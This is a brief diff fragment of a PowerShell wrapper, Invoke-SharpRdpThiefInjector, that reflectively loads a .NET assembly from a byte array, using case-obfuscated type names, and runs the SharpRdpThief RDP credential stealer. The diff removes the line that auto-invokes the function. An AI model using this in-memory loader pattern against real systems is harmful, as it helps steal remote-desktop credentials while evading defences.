@@ -8,4 +8,3 @@ function Invoke-SharpRdpThiefInjector
     $RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
     [SharpRdpThief.Program]::maiN(" ".Split())
 }
-Invoke-SharpRdpThiefInjector
